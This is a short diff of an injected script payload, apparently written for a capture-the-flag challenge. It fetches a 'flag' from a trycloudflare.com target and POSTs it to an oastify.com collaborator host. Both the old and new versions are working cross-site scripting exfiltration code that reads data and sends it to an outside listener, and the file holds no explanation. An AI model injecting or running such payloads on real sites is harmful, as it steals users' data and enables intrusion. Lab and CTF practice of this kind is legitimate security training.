@@ -1,11 +1,19 @@
 <script>
 (async () => {
-  const flag = await fetch('https://tar-award-writers-controllers.trycloudflare.com/flag').then(r => r.text());
- 
-  await fetch('https://1prttq5teeywmghkpgb1yhv5iwonci07.oastify.com/capture', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: flag
-  });
+  try {
+    // Use the full target URL
+    const flag = await fetch('https://tar-award-writers-controllers.trycloudflare.com/flag').then(r => r.text());
+    
+    // Send to your collaborator
+    await fetch('https://6x4y1vdymj61ulppxlj66m3aq1wskk89.oastify.com/capture', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain'
+      },
+      body: flag
+    });
+  } catch (error) {
+    console.error('Error:', error);
+  }
 })();
 </script>
